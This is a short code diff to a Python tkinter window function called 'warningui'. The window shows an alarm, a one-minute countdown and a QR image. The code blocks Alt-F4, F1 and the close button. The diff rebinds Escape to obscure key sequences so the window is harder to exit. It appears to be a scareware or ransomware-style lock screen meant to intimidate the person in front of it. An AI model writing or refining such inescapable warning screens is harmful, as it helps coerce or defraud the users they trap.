@@ -90,7 +90,7 @@ def warningui():
 
     left_frame = tk.Frame(root)
     left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=50, pady=50)
-    root.bind("<Escape>", lambda event: exit(event, root))
+    root.bind("<Escape>+<0>", lambda event: exit(event, root))
     right_frame = tk.Frame(root)
     right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=50, pady=50)
     alarm_label = tk.Label(left_frame)
@@ -119,7 +119,7 @@ def warningui():
     timer_label = tk.Label(left_frame, text="01:00", font=timer_font)
     timer_label.pack(pady=10, expand=True, anchor="n")
 
-    countdown(60, timer_label)
+    countdown(60, timer_label)#change timer optionall
     try:
         qr_image = Image.open("qr.jpeg")
         qr_image = qr_image.resize((450, 450), Image.Resampling.LANCZOS)
@@ -134,7 +134,7 @@ def warningui():
     root.protocol("WM_DELETE_WINDOW", on_closing)
     root.bind("<Alt-F4>", lambda e: "break") 
     root.bind("<F1>", lambda e: "break")
-    root.bind("<Escape>", lambda event: on_closing())
+    root.bind("<Escape><0>", lambda event: on_closing())
     root.mainloop()
 def countdown(time_left, label):
     if time_left >= 0:
